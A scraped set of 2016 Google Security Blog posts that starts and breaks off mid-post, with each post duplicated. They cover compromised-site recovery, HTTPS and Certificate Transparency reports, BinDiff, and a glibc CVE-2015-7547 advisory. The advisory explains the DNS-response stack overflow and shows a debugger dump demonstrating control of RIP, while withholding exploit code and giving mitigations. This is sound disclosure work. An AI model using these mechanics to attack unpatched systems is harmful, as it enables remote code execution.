3 days. This is a better experience for webmasters and their audience.   How many sites get compromised?                 Number of freshly compromised sites Google detects every week.     Over the last year Google detected nearly 800,000 compromised websites&#8212;roughly 16,500 new sites every week from around the globe. Visitors to these sites are exposed to low-quality scam content and malware via  drive-by downloads . While browser and search warnings help protect visitors from harm, these warnings can at times feel punitive to webmasters who learn only after-the-fact that their site was compromised. To balance the safety of our users with the experience of webmasters, we set out to find the best approach to help webmasters recover from security breaches and ultimately reconnect websites with their audience.   Finding the most effective ways to aid&nbsp;webmaster         Getting in touch with webmasters:  One of the hardest steps on the road to recovery is first getting in contact with webmasters. We tried three notification channels: email, browser warnings, and search warnings. For webmasters who proactively registered their site with  Search Console , we found that email communication led to 75% of webmasters re-securing their pages. When we didn&#8217;t know a webmaster&#8217;s email address, browser warnings and search warnings helped 54% and 43% of sites clean up respectively.    Providing tips on cleaning up harmful content:  Attackers rely on hidden files, easy-to-miss redirects, and remote inclusions to serve scams and malware. This makes clean-up increasingly tricky. When we emailed webmasters, we included tips and samples of exactly which pages contained harmful content. This, combined with expedited notification, helped webmasters clean up 62% faster compared to no tips&#8212;usually within 3 days.    Making sure sites stay clean:  Once a site is no longer serving harmful content, it&#8217;s important to make sure attackers don&#8217;t reassert control. We monitored recently cleaned websites and found 12% were compromised again in 30 days. This illustrates the challenge involved in identifying the root cause of a breach versus dealing with the side-effects.       Making security issues less painful for webmasters&#8212;and everyone          We hope that webmasters never have to deal with a security incident. If you are a webmaster, there are some quick steps you can take to reduce your risk. We&#8217;ve made it easier to  receive security notifications through Google Analytics  as well as through  Search Console . Make sure to register for both services. Also, we have laid out helpful tips for  updating your site&#8217;s software  and  adding additional authentication  that will make your site safer.         If you&#8217;re a hosting provider or building a service that needs to notify victims of compromise, understand that the entire process is distressing for users. Establish a reliable communication channel before a security incident occurs, make sure to provide victims with clear recovery steps, and promptly reply to inquiries so the process feels helpful, not punitive.         As we work to make the web a safer place, we think it&#8217;s critical to empower webmasters and users to make good security decisions. It&#8217;s easy for the security community to be pessimistic about incident response being &#8216;too complex&#8217; for victims, but as our findings demonstrate, even just starting a dialogue can significantly expedite recovery.                                     Posted by Kurt Thomas and Yuan Niu, Spam & Abuse Research Every week, over 10 million users encounter harmful websites that deliver malware and scams. Many of these sites are compromised personal blogs or small business pages that have fallen victim due to a weak password or outdated software. Safe Browsing and Google Search protect visitors from dangerous content by displaying browser warnings and labeling search results with 'this site may harm your computer'. While this helps keep users safe in the moment, the compromised site remains a problem that needs to be fixed.  Unfortunately, many webmasters for compromised sites are unaware anything is amiss. Worse yet, even when they learn of an incident, they may lack the security expertise to take action and address the root cause of compromise. Quoting one webmaster from a survey we conducted, “our daily and weekly backups were both infected” and even after seeking the help of a specialist, after “lots of wasted hours/days” the webmaster abandoned all attempts to restore the site and instead refocused his efforts on “rebuilding the site from scratch”.  In order to find the best way to help webmasters clean-up from compromise, we recently teamed up with the University of California, Berkeley to explore how to quickly contact webmasters and expedite recovery while minimizing the distress involved. We’ve summarized our key lessons below. The full study, which you can read here, was recently presented at the International World Wide Web Conference.  When Google works directly with webmasters during critical moments like security breaches, we can help 75% of webmasters re-secure their content. The whole process takes a median of 3 days. This is a better experience for webmasters and their audience. How many sites get compromised?     Number of freshly compromised sites Google detects every week.  Over the last year Google detected nearly 800,000 compromised websites—roughly 16,500 new sites every week from around the globe. Visitors to these sites are exposed to low-quality scam content and malware via drive-by downloads. While browser and search warnings help protect visitors from harm, these warnings can at times feel punitive to webmasters who learn only after-the-fact that their site was compromised. To balance the safety of our users with the experience of webmasters, we set out to find the best approach to help webmasters recover from security breaches and ultimately reconnect websites with their audience. Finding the most effective ways to aid webmaster   Getting in touch with webmasters: One of the hardest steps on the road to recovery is first getting in contact with webmasters. We tried three notification channels: email, browser warnings, and search warnings. For webmasters who proactively registered their site with Search Console, we found that email communication led to 75% of webmasters re-securing their pages. When we didn’t know a webmaster’s email address, browser warnings and search warnings helped 54% and 43% of sites clean up respectively. Providing tips on cleaning up harmful content: Attackers rely on hidden files, easy-to-miss redirects, and remote inclusions to serve scams and malware. This makes clean-up increasingly tricky. When we emailed webmasters, we included tips and samples of exactly which pages contained harmful content. This, combined with expedited notification, helped webmasters clean up 62% faster compared to no tips—usually within 3 days. Making sure sites stay clean: Once a site is no longer serving harmful content, it’s important to make sure attackers don’t reassert control. We monitored recently cleaned websites and found 12% were compromised again in 30 days. This illustrates the challenge involved in identifying the root cause of a breach versus dealing with the side-effects.   Making security issues less painful for webmasters—and everyone    We hope that webmasters never have to deal with a security incident. If you are a webmaster, there are some quick steps you can take to reduce your risk. We’ve made it easier to receive security notifications through Google Analytics as well as through Search Console. Make sure to register for both services. Also, we have laid out helpful tips for updating your site’s software and adding additional authentication that will make your site safer.    If you’re a hosting provider or building a service that needs to notify victims of compromise, understand that the entire process is distressing for users. Establish a reliable communication channel before a security incident occurs, make sure to provide victims with clear recovery steps, and promptly reply to inquiries so the process feels helpful, not punitive.    As we work to make the web a safer place, we think it’s critical to empower webmasters and users to make good security decisions. It’s easy for the security community to be pessimistic about incident response being ‘too complex’ for victims, but as our findings demonstrate, even just starting a dialogue can significantly expedite recovery.     ", "date": "April 18, 2016"},
{"website": "Google-Security", "title": "\nCVE-2015-7547: glibc getaddrinfo stack-based buffer overflow\n", "author": ["Posted by Fermin J. Serna, Staff Security Engineer and Kevin Stadmeyer, Technical Program Manager"], "link": "https://security.googleblog.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html", "abstract": "                             Posted by Fermin J. Serna, Staff Security Engineer and Kevin Stadmeyer, Technical Program Manager     Have you ever been deep in the mines of debugging and suddenly realized that you were staring at something far more interesting than you were expecting? You are not alone! Recently a Google engineer noticed that their SSH client segfaulted every time they tried to connect to a specific host. That engineer filed a ticket to investigate the behavior and after an intense investigation we discovered the issue lay in glibc and not in SSH as we were expecting.    Thanks to this engineer&#8217;s keen observation, we were able determine that the issue could result in remote code execution. We immediately began an in-depth analysis of the issue to determine whether it could be exploited, and possible fixes. We saw this as a challenge, and after some intense hacking sessions, we were able to craft a full working exploit!    In the course of our investigation, and to our surprise, we learned that the glibc maintainers had previously been alerted of the issue via their bug tracker in July, 2015. ( bug ). We couldn't immediately tell whether the bug fix was underway, so we worked hard to make sure we understood the issue and then reached out to the glibc maintainers. To our delight, Florian Weimer and Carlos O&#8217;Donell of  Red Hat  had also been studying the bug&#8217;s impact, albeit completely independently! Due to the sensitive nature of the issue, the investigation, patch creation, and regression tests performed primarily by Florian and Carlos had continued &#8220;off-bug.&#8221;    This was an amazing coincidence, and thanks to their hard work and cooperation, we were able to translate both teams&#8217; knowledge into a comprehensive patch and regression test to protect glibc users.    That patch is available  here .     Issue Summary:     Our initial investigations showed that the issue affected all the versions of glibc since 2.9. You should definitely update if you are on an older version though. If the vulnerability is detected, machine owners may wish to take steps to mitigate the risk of an attack.    The glibc DNS client side resolver is vulnerable to a stack-based buffer overflow when the getaddrinfo() library function is used. Software using this function may be exploited with attacker-controlled domain names, attacker-controlled DNS servers, or through a man-in-the-middle attack.    Google has found some mitigations that may help prevent exploitation if you are not able to immediately patch your instance of glibc. The vulnerability relies on an oversized (2048+ bytes) UDP or TCP response, which is followed by another response that will overwrite the stack. Our suggested mitigation is to limit the response (i.e., via DNSMasq or similar programs) sizes accepted by the DNS resolver locally as well as to ensure that DNS queries are sent only to DNS servers which limit the response size for UDP responses with the truncation bit set.     Technical information:     glibc reserves 2048 bytes in the stack through alloca() for the DNS answer at _nss_dns_gethostbyname4_r() for hosting responses to a DNS query.    Later on, at send_dg() and send_vc(), if the response is larger than 2048 bytes, a new buffer is allocated from the heap and all the information (buffer pointer, new buffer size and response size) is updated.    Under certain conditions a mismatch between the stack buffer and the new heap allocation will happen. The final effect is that the stack buffer will be used to store the DNS response, even though the response is larger than the stack buffer and a heap buffer was allocated. This behavior leads to the stack buffer overflow.    The vectors to trigger this buffer overflow are very common and can include ssh, sudo, and curl. We are confident that the exploitation vectors are diverse and widespread; we have not attempted to enumerate these vectors further.     Exploitation:     Remote code execution is possible, but not straightforward. It requires bypassing the security mitigations present on the system, such as ASLR. We will not release our exploit code, but a non-weaponized Proof of Concept has been made available simultaneously with this blog post. With this  Proof of Concept , you can verify if you are affected by this issue, and verify any mitigations you may wish to enact.    As you can see in the below debugging session we are able to reliably control EIP/RIP.    (gdb) x/i $rip  =&gt; 0x7fe156f0ccce &lt;_nss_dns_gethostbyname4_r+398&gt;: req  (gdb) x/a $rsp  0x7fff56fd8a48: 0x4242424242424242 0x4242424242420042    When code crashes unexpectedly, it can be a sign of something much more significant than it appears; ignore crashes at your peril!    Failed exploit indicators, due to ASLR, can range from:       Crash on free(ptr) where ptr is controlled by the attacker.&nbsp;   Crash on free(ptr) where ptr is semi-controlled by the attacker since ptr has to be a valid readable address.&nbsp;   Crash reading from memory pointed by a local overwritten variable.&nbsp;   Crash writing to memory on an attacker-controlled pointer.      We would like to thank Neel Mehta, Thomas Garnier, Gynvael Coldwind, Michael Schaller, Tom Payne, Michael Haro, Damian Menscher, Matt Brown, Yunhong Gu, Florian Weimer, Carlos O&#8217;Donell and the rest of the glibc team for their help figuring out all details about this bug, exploitation, and patch development.                                   Posted by Fermin J. Serna, Staff Security Engineer and Kevin Stadmeyer, Technical Program Manager  Have you ever been deep in the mines of debugging and suddenly realized that you were staring at something far more interesting than you were expecting? You are not alone! Recently a Google engineer noticed that their SSH client segfaulted every time they tried to connect to a specific host. That engineer filed a ticket to investigate the behavior and after an intense investigation we discovered the issue lay in glibc and not in SSH as we were expecting.  Thanks to this engineer’s keen observation, we were able determine that the issue could result in remote code execution. We immediately began an in-depth analysis of the issue to determine whether it could be exploited, and possible fixes. We saw this as a challenge, and after some intense hacking sessions, we were able to craft a full working exploit!  In the course of our investigation, and to our surprise, we learned that the glibc maintainers had previously been alerted of the issue via their bug tracker in July, 2015. (bug). We couldn't immediately tell whether the bug fix was underway, so we worked hard to make sure we understood the issue and then reached out to the glibc maintainers. To our delight, Florian Weimer and Carlos O’Donell of Red Hat had also been studying the bug’s impact, albeit completely independently! Due to the sensitive nature of the issue, the investigation, patch creation, and regression tests performed primarily by Florian and Carlos had continued “off-bug.”  This was an amazing coincidence, and thanks to their hard work and cooperation, we were able to translate both teams’ knowledge into a comprehensive patch and regression test to protect glibc users.  That patch is available here.  Issue Summary:  Our initial investigations showed that the issue affected all the versions of glibc since 2.9. You should definitely update if you are on an older version though. If the vulnerability is detected, machine owners may wish to take steps to mitigate the risk of an attack.  The glibc DNS client side resolver is vulnerable to a stack-based buffer overflow when the getaddrinfo() library function is used. Software using this function may be exploited with attacker-controlled domain names, attacker-controlled DNS servers, or through a man-in-the-middle attack.  Google has found some mitigations that may help prevent exploitation if you are not able to immediately patch your instance of glibc. The vulnerability relies on an oversized (2048+ bytes) UDP or TCP response, which is followed by another response that will overwrite the stack. Our suggested mitigation is to limit the response (i.e., via DNSMasq or similar programs) sizes accepted by the DNS resolver locally as well as to ensure that DNS queries are sent only to DNS servers which limit the response size for UDP responses with the truncation bit set.  Technical information:  glibc reserves 2048 bytes in the stack through alloca() for the DNS answer at _nss_dns_gethostbyname4_r() for hosting responses to a DNS query.  Later on, at send_dg() and send_vc(), if the response is larger than 2048 bytes, a new buffer is allocated from the heap and all the information (buffer pointer, new buffer size and response size) is updated.  Under certain conditions a mismatch between the stack buffer and the new heap allocation will happen. The final effect is that the stack buffer will be used to store the DNS response, even though the response is larger than the stack buffer and a heap buffer was allocated. This behavior leads to the stack buffer overflow.  The vectors to trigger this buffer overflow are very common and can include ssh, sudo, and curl. We are confident that the exploitation vectors are diverse and widespread; we have not attempted to enumerate these vectors further.  Exploitation:  Remote code execution is possible, but not straightforward. It requires bypassing the security mitigations present on the system, such as ASLR. We will not release our exploit code, but a non-weaponized Proof of Concept has been made available simultaneously with this blog post. With this Proof of Concept, you can verify if you are affected by this issue, and verify any mitigations you may wish to enact.  As you can see in the below debugging session we are able to reliably control EIP/RIP.  (gdb) x/i $rip => 0x7fe156f0ccce  : req (gdb) x/a $rsp 0x7fff56fd8a48: 0x4242424242424242 0x4242424242420042  When code crashes unexpectedly, it can be a sign of something much more significant than it appears; ignore crashes at your peril!  Failed exploit indicators, due to ASLR, can range from:   Crash on free(ptr) where ptr is controlled by the attacker.  Crash on free(ptr) where ptr is semi-controlled by the attacker since ptr has to be a valid readable address.  Crash reading from memory pointed by a local overwritten variable.  Crash writing to memory on an attacker-controlled pointer.   We would like to thank Neel Mehta, Thomas Garnier, Gynvael Coldwind, Michael Schaller, Tom Payne, Michael Haro, Damian Menscher, Matt Brown, Yunhong Gu, Florian Weimer, Carlos O’Donell and the rest of the glibc team for their help figuring out all details about this bug, exploitation, and patch development.     ", "date": "February 16, 2016"},
{"website": "Google-Security", "title": "\nScalable vendor security reviews\n", "author": ["Posted by Lukas Weichselbaum and Daniel Fabian, Google Security"], "link": "https://security.googleblog.com/2016/03/scalable-vendor-security-reviews.html", "abstract": "                             Posted by Lukas Weichselbaum and Daniel Fabian, Google Security      [Cross-posted on the  Google Open Source Blog ]     At Google, we assess the security of hundreds of vendors every year. We scale our efforts through automating much of the initial information gathering and triage portions of the vendor review process. To do this we've developed the Vendor Security Assessment Questionnaire (VSAQ), a collection of self-adapting questionnaires for evaluating multiple aspects of a vendor's security and privacy posture.    We've received feedback from many vendors who completed the questionnaires. Most vendors found them intuitive and flexible &#8212; and, even better, they've been able to use the embedded tips and recommendations to improve their security posture. Some also expressed interest in using the questionnaires to assess their own suppliers.    Based on this positive response, we've decided to open source the VSAQ Framework (Apache License Version 2) and the generally applicable parts of our questionnaires on GitHub:  https://github.com/google/vsaq . We hope it will help companies spin up, or further improve their own vendor security programs. We also hope the base questionnaires can serve as a self-assessment tool for security-conscious companies and developers looking to improve their security posture.    The VSAQ Framework comes with four security questionnaire templates that can be used with the VSAQ rendering engine:        Web Application Security Questionnaire     Security &amp; Privacy Program Questionnaire     Infrastructure Security Questionnaire     Physical &amp; Data Center Security Questionnaire            All four base questionnaire templates can be readily extended with company-specific questions. Using the same questionnaire templates across companies may help to scale assessment efforts. Common templates can also minimize the burden on vendor companies, by facilitating the reuse of responses.         The  VSAQ Framework  comes with a simple client-side-only reference implementation that's suitable for self-assessments, for vendor security programs with a moderate throughput, and for just trying out the framework. For a high-throughput vendor security program, we recommend using the VSAQ Framework with a custom server-side component that fits your needs (the interface is quite simple).         Give VSAQ a try! A demo version of the VSAQ Framework is available here:  https://vsaq-demo.withgoogle.com              Excerpt from Security and Privacy Programs Questionnaire          Let us know how VSAQ works for you:  contact us . We look forward to getting your feedback and continuing to make vendor reviews scalable &#8212; and maybe even fun!                                     Posted by Lukas Weichselbaum and Daniel Fabian, Google Security  [Cross-posted on the Google Open Source Blog]  At Google, we assess the security of hundreds of vendors every year. We scale our efforts through automating much of the initial information gathering and triage portions of the vendor review process. To do this we've developed the Vendor Security Assessment Questionnaire (VSAQ), a collection of self-adapting questionnaires for evaluating multiple aspects of a vendor's security and privacy posture.  We've received feedback from many vendors who completed the questionnaires. Most vendors found them intuitive and flexible — and, even better, they've been able to use the embedded tips and recommendations to improve their security posture. Some also expressed interest in using the questionnaires to assess their own suppliers.  Based on this positive response, we've decided to open source the VSAQ Framework (Apache License Version 2) and the generally applicable parts of our questionnaires on GitHub: https://github.com/google/vsaq. We hope it will help companies spin up, or further improve their own vendor security programs. We also hope the base questionnaires can serve as a self-assessment tool for security-conscious companies and developers looking to improve their security posture.  The VSAQ Framework comes with four security questionnaire templates that can be used with the VSAQ rendering engine:   Web Application Security Questionnaire Security & Privacy Program Questionnaire Infrastructure Security Questionnaire Physical & Data Center Security Questionnaire     All four base questionnaire templates can be readily extended with company-specific questions. Using the same questionnaire templates across companies may help to scale assessment efforts. Common templates can also minimize the burden on vendor companies, by facilitating the reuse of responses.    The VSAQ Framework comes with a simple client-side-only reference implementation that's suitable for self-assessments, for vendor security programs with a moderate throughput, and for just trying out the framework. For a high-throughput vendor security program, we recommend using the VSAQ Framework with a custom server-side component that fits your needs (the interface is quite simple).    Give VSAQ a try! A demo version of the VSAQ Framework is available here: https://vsaq-demo.withgoogle.com    Excerpt from Security and Privacy Programs Questionnaire    Let us know how VSAQ works for you: contact us. We look forward to getting your feedback and continuing to make vendor reviews scalable — and maybe even fun!     ", "date": "March 7, 2016"},
{"website": "Google-Security", "title": "\nGet Rich or Hack Tryin’\n", "author": ["Posted by Nathan Parker, Chrome Defender and Tim Willis, Hacker Philanthropist"], "link": "https://security.googleblog.com/2016/03/get-rich-or-hack-tryin.html", "abstract": "                             Posted by Nathan Parker, Chrome Defender and Tim Willis, Hacker Philanthropist     Since 2010, we've happily rewarded researchers who find and report security issues to us through Google&#8217;s Security Reward Program. Last year,  Google paid researchers more than $2,000,000 for their work  to make Google users safer.    It's no secret that Chrome takes security seriously. Today, we&#8217;re introducing two new changes to expand the Chrome Reward Program even further:        Increasing our top reward from $50,000 to $100,000.  Last year we introduced a $50,000 reward for the persistent compromise of a Chromebook in guest mode. Since we introduced the $50,000 reward, we haven&#8217;t had a successful submission. That said, great research deserves great awards, so we&#8217;re putting up a standing six-figure sum, available all year round with no quotas and no maximum reward pool.        Adding a Download Protection Bypass bounty.  We&#8217;re extending our reward program scope to include rewards for methods that bypass Chrome&#8217;s  Safe Browsing   download protection features . There&#8217;s much more detail on this new category on  our rewards page  - be sure to take a look if you&#8217;re interested.           We look forward to seeing some amazing bugs and continuing to work with the security research community.         Happy hacking!                                     Posted by Nathan Parker, Chrome Defender and Tim Willis, Hacker Philanthropist  Since 2010, we've happily rewarded researchers who find and report security issues to us through Google’s Security Reward Program. Last year, Google paid researchers more than $2,000,000 for their work to make Google users safer.  It's no secret that Chrome takes security seriously. Today, we’re introducing two new changes to expand the Chrome Reward Program even further:   Increasing our top reward from $50,000 to $100,000. Last year we introduced a $50,000 reward for the persistent compromise of a Chromebook in guest mode. Since we introduced the $50,000 reward, we haven’t had a successful submission. That said, great research deserves great awards, so we’re putting up a standing six-figure sum, available all year round with no quotas and no maximum reward pool.   Adding a Download Protection Bypass bounty. We’re extending our reward program scope to include rewards for methods that bypass Chrome’s Safe Browsing download protection features. There’s much more detail on this new category on our rewards page - be sure to take a look if you’re interested.     We look forward to seeing some amazing bugs and continuing to work with the security research community.    Happy hacking!     ", "date": "March 14, 2016"},
{"website": "Google-Security", "title": "\nSecuring the web, together\n", "author": ["Posted by Rutledge Chin Feman and Tim Willis, HTTPS Evangelists"], "link": "https://security.googleblog.com/2016/03/securing-web-together_15.html", "abstract": "                             Posted by Rutledge Chin Feman and Tim Willis, HTTPS Evangelists     Encryption keeps people&#8217;s information safe as it moves between their devices and Google, protecting it from interception and unauthorized access by attackers. With a modern encrypted connection, you can be confident that your data will be private and secure.    Today we are launching a new section of our  Transparency Report  to track the progress of encryption efforts&#8212;both at Google and on some of the web's most trafficked sites. Our aim with this project is to hold ourselves accountable and encourage others to encrypt so we can make the web even safer for everyone.    Here's an overview of what is included in the new report:   Google sites   Every week, we&#8217;ll update this report with progress we've made towards implementing HTTPS by default across Google&#8217;s services. We&#8217;ve long offered Gmail, Drive, and Search over HTTPS, and in the last year, we&#8217;ve begun to add traffic from more products, like  ads  and  Blogger  as well.    We're making positive strides, but we still have a ways to go.        This chart represents the percentage of requests to Google's servers that used encrypted connections. YouTube traffic is currently not included in this data.          We plan on adding additional Google products over time to increase the scope of this report.                   Popular third-party sites          Our report also includes data about the  HTTPS connections on many popular sites across the web , beyond Google. We've chosen these sites based on a combination of publicly-available  Alexa data  and our own Google internal data; we estimate they account for approximately 25% of all web traffic on the Internet.                   Certificate Transparency          Websites use certificates to assert to users that they are legitimate, so browsers need to be able to check whether the certificate that you&#8217;re being presented is valid and appropriately issued. That is why this report also offers a  Certificate Transparency log viewer , providing a web interface for users and site administrators to easily check and see who has issued a certificate for a website. For example, if you use this log viewer and search for google.com with &#8216;include expired' checked, you'll see the  mis-issued google.com certificate from September 2015 .                 Encryption for everyone          Implementing HTTPS can be difficult&#8212;we know from experience! Some common obstacles include:&nbsp;         Older hardware and/or software that doesn&#8217;t support modern encryption technologies.   Governments and organizations that may block or otherwise degrade HTTPS traffic.   Organizations that may not have the desire or technical resources to implement HTTPS.    While there&#8217;s no one-size-fits-all solution to these challenges,  we&#8217;ve put together a resource for webmasters to use  as they work through this process. We also support industry-wide efforts, like EFF's &#8216; Encrypt the Web &#8217; report, that aim to bring more of the web to HTTPS.         Implementing encryption is not easy work. But, as more people spend more of their time on the web, it&#8217;s an increasingly essential element of online security. We hope this report will provide a snapshot of our own encryption efforts and will encourage everyone to make HTTPS the default on the web, even faster.                                      Posted by Rutledge Chin Feman and Tim Willis, HTTPS Evangelists  Encryption keeps people’s information safe as it moves between their devices and Google, protecting it from interception and unauthorized access by attackers. With a modern encrypted connection, you can be confident that your data will be private and secure.  Today we are launching a new section of our Transparency Report to track the progress of encryption efforts—both at Google and on some of the web's most trafficked sites. Our aim with this project is to hold ourselves accountable and encourage others to encrypt so we can make the web even safer for everyone.  Here's an overview of what is included in the new report: Google sites Every week, we’ll update this report with progress we've made towards implementing HTTPS by default across Google’s services. We’ve long offered Gmail, Drive, and Search over HTTPS, and in the last year, we’ve begun to add traffic from more products, like ads and Blogger as well.  We're making positive strides, but we still have a ways to go.  This chart represents the percentage of requests to Google's servers that used encrypted connections. YouTube traffic is currently not included in this data.    We plan on adding additional Google products over time to increase the scope of this report.      Popular third-party sites    Our report also includes data about the HTTPS connections on many popular sites across the web, beyond Google. We've chosen these sites based on a combination of publicly-available Alexa data and our own Google internal data; we estimate they account for approximately 25% of all web traffic on the Internet.      Certificate Transparency    Websites use certificates to assert to users that they are legitimate, so browsers need to be able to check whether the certificate that you’re being presented is valid and appropriately issued. That is why this report also offers a Certificate Transparency log viewer, providing a web interface for users and site administrators to easily check and see who has issued a certificate for a website. For example, if you use this log viewer and search for google.com with ‘include expired' checked, you'll see the mis-issued google.com certificate from September 2015.      Encryption for everyone    Implementing HTTPS can be difficult—we know from experience! Some common obstacles include:     Older hardware and/or software that doesn’t support modern encryption technologies. Governments and organizations that may block or otherwise degrade HTTPS traffic. Organizations that may not have the desire or technical resources to implement HTTPS.  While there’s no one-size-fits-all solution to these challenges, we’ve put together a resource for webmasters to use as they work through this process. We also support industry-wide efforts, like EFF's ‘Encrypt the Web’ report, that aim to bring more of the web to HTTPS.    Implementing encryption is not easy work. But, as more people spend more of their time on the web, it’s an increasingly essential element of online security. We hope this report will provide a snapshot of our own encryption efforts and will encourage everyone to make HTTPS the default on the web, even faster.      ", "date": "March 15, 2016"},
{"website": "Google-Security", "title": "\nBinDiff now available for free\n", "author": ["Posted by Christian Blichmann, Software Engineer"], "link": "https://security.googleblog.com/2016/03/bindiff-now-available-for-free.html", "abstract": "                             Posted by Christian Blichmann, Software Engineer     BinDiff is a comparison tool for binary files that helps to quickly find differences and similarities in disassembled code. It is used by security researchers and engineers across the globe to identify and isolate fixes for vulnerabilities in vendor-supplied patches and to analyze multiple versions of the same binary. Another common use case is to transfer analysis results from one binary to another, helping to prevent duplicate analyses of, for example, malware binaries. This also helps to retain knowledge across teams of binary analysts where the individual workflows might vary from analyst to analyst.    More specifically, BinDiff can be used to:       Compare binary files for x86, MIPS, ARM/AArch64, PowerPC, and other architectures.   Identify identical and similar functions in different binaries.   Port function names, comments and local variable names from one disassembly to another.   Detect and highlight changes between two variants of the same function.           Here is a screenshot demonstrating what using BinDiff to display per-function differences looks like:                At Google, the BinDiff core engine powers a large-scale malware processing pipeline helping to protect both internal and external users. BinDiff provides the underlying comparison results needed to cluster the world's malware into related families with billions of comparisons performed so far.              Ever since zynamics  joined Google  in 2011, we have been committed to keeping our most valuable tools available to the security research community. We first lowered the price, and today we are taking the next logical step by making it available free of charge.              You can download BinDiff from the  zynamics web site . It&#8217;s the current version, BinDiff 4.2 for both Linux and Windows. To use it, you also need the commercial Hex-Rays IDA Pro disassembler, 6.8 or later.              Happy BinDiff-ing!                                     Posted by Christian Blichmann, Software Engineer  BinDiff is a comparison tool for binary files that helps to quickly find differences and similarities in disassembled code. It is used by security researchers and engineers across the globe to identify and isolate fixes for vulnerabilities in vendor-supplied patches and to analyze multiple versions of the same binary. Another common use case is to transfer analysis results from one binary to another, helping to prevent duplicate analyses of, for example, malware binaries. This also helps to retain knowledge across teams of binary analysts where the individual workflows might vary from analyst to analyst.  More specifically, BinDiff can be used to:   Compare binary files for x86, MIPS, ARM/AArch64, PowerPC, and other architectures. Identify identical and similar functions in different binaries. Port function names, comments and local variable names from one disassembly to another. Detect and highlight changes between two variants of the same function.     Here is a screenshot demonstrating what using BinDiff to display per-function differences looks like:      At Google, the BinDiff core engine powers a large-scale malware processing pipeline helping to protect both internal and external users. BinDiff provides the underlying comparison results needed to cluster the world's malware into related families with billions of comparisons performed so far.      Ever since zynamics joined Google in 2011, we have been committed to keeping our most valuable tools available to the security research community. We first lowered the price, and today we are taking the next logical step by making it available free of charge.      You can download BinDiff from the zynamics web site. It’s the current version, BinDiff 4.2 for both Linux and Windows. To use it, you also need the commercial Hex-Rays IDA Pro disassembler, 6.8 or later.      Happy BinDiff-ing!     ", "date": "March 18, 2016"},
{"website": "Google-Security", "title": "\nCertificate Transparency for Untrusted CAs\n", "author": ["Posted by Martin Smith, Software Engineer, Certificate Transparency"], "link": "https://security.googleblog.com/2016/03/certificate-transparency-for-untrusted.html", "abstract": "                             Posted by Martin Smith, Software Engineer, Certificate Transparency     Today we are announcing a new Certificate Transparency log for a new set of root certificates: those that were once or are not yet trusted by browsers.     Certificate Transparency  (CT) data has a number of different uses, including protecting users from mis-issued certificates and providing webmasters and other interested parties with a public record of what certificates have been issued for domains.     Initially , our logs included browser-trusted Certificate Authorities (CAs). However, there are two main classes of CA that can&#8217;t easily be included in the existing logs:       Those that were once trusted and have since been withdrawn from the root programs.   New CAs that are on the path to inclusion in browser trusted roots.           Including these in trusted logs is problematic for several reasons, including uncertainties around revocation policies and the possibility of cross-signing attacks being attempted by malicious third-parties.              However, visibility of these CAs&#8217; activities is still useful, so we have created a new CT log for these certificates. This log will not be trusted by Chrome, and will provide a public record of certificates that are not accepted by the existing Google-operated logs.              The new log is accessible at  ct.googleapis.com/submariner  and is listed on our  Known Logs  page. It has the same API as the existing logs.              Initially, Submariner includes certificates chaining up to the set of root certificates that  Symantec  recently announced it had discontinued, as well as a  collection of additional roots  suggested to us that are pending inclusion in Mozilla.              Once Symantec&#8217;s affected certificates are no longer trusted by browsers, we will be withdrawing them from the trusted roots accepted by our existing logs (Aviator, Pilot, and Rocketeer).              Third parties are invited to suggest additional roots for potential inclusion in the new log by email to  google-ct-logs@googlegroups.com .              Everyone is welcome to make use of the log to submit certificates and query data. We hope it will prove useful and help to improve web security.                                     Posted by Martin Smith, Software Engineer, Certificate Transparency  Today we are announcing a new Certificate Transparency log for a new set of root certificates: those that were once or are not yet trusted by browsers.  Certificate Transparency (CT) data has a number of different uses, including protecting users from mis-issued certificates and providing webmasters and other interested parties with a public record of what certificates have been issued for domains.  Initially, our logs included browser-trusted Certificate Authorities (CAs). However, there are two main classes of CA that can’t easily be included in the existing logs:   Those that were once trusted and have since been withdrawn from the root programs. New CAs that are on the path to inclusion in browser trusted roots.     Including these in trusted logs is problematic for several reasons, including uncertainties around revocation policies and the possibility of cross-signing attacks being attempted by malicious third-parties.      However, visibility of these CAs’ activities is still useful, so we have created a new CT log for these certificates. This log will not be trusted by Chrome, and will provide a public record of certificates that are not accepted by the existing Google-operated logs.      The new log is accessible at ct.googleapis.com/submariner and is listed on our Known Logs page. It has the same API as the existing logs.      Initially, Submariner includes certificates chaining up to the set of root certificates that Symantec recently announced it had discontinued, as well as a collection of additional roots suggested to us that are pending inclusion in Mozilla.      Once Symantec’s affected certificates are no longer trusted by browsers, we will be withdrawing them from the trusted roots accepted by our existing logs (Aviator, Pilot, and Rocketeer).      Third parties are invited to suggest additional roots for potential inclusion in the new log by email to google-ct-logs@googlegroups.com.      Everyone is welcome to make use of the log to submit certificates and query data. We hope it will prove useful and help to improve web security.     ", "date": "March 21, 2016"},
{"website": "Google-Security", "title": "\nMore Encryption, More Notifications, More Email Security\n", "author": ["Posted by Nicolas Lidzborski, Gmail Security Engineering Lead and Jonathan Pevarnek, ", " Engineer"], "link": "https://security.googleblog.com/2016/03/more-encryption-more-notifications-more.html", "abstract": "                             Posted by Nicolas Lidzborski, Gmail Security Engineering Lead and Jonathan Pevarnek,  Jigsaw  Engineer     Today, we&#8217;re announcing a variety of new protections that will help keep Gmail users even safer and promote email security best practices across the Internet as a whole.     New tools and industry standards make email even safer     On  Safer Internet Day  this year, we introduced a new visual element to Gmail that lets users know when they&#8217;ve received a message that wasn&#8217;t delivered using encryption or if they&#8217;re composing a message to a recipient whose email service doesn&#8217;t support TLS encryption. It&#8217;s the red lock icon featured below:         This has had an immediate, positive effect on Gmail security. In the 44 days since we introduced it, the amount of inbound mail sent over an encrypted connection  increased by 25% . We&#8217;re very encouraged by this progress! Given the relative ease of implementing encryption and its significant benefits for users, we expect to see this progress continue.    However, as our recent  research  with the University of Michigan and University of Illinois shows, misconfigured or malicious parts of the Internet can still tamper with email encryption. To help ensure TLS encryption works as intended, we&#8217;ve teamed-up with a variety of industry partners &#8212; including Comcast, Microsoft, and Yahoo!&#8212; to submit a  draft IETF specification  for &#8220;SMTP Strict Transport Security.&#8221; With this new proposed standard, companies can ensure that mail will only be delivered through encrypted channels, and that any encryption failures should be reported for further analysis, helping shine the spotlight on any malfeasance occurring around the Internet.     Safe Browsing makes Gmail more secure     Since 2007,  Safe Browsing  has protected users across the web by warning them before they visit dangerous sites known for phishing, malware, and  Unwanted Software . Over the years, we&#8217;ve brought the protections afforded by Safe Browsing to other Google products as well, including: Chrome,  Android , 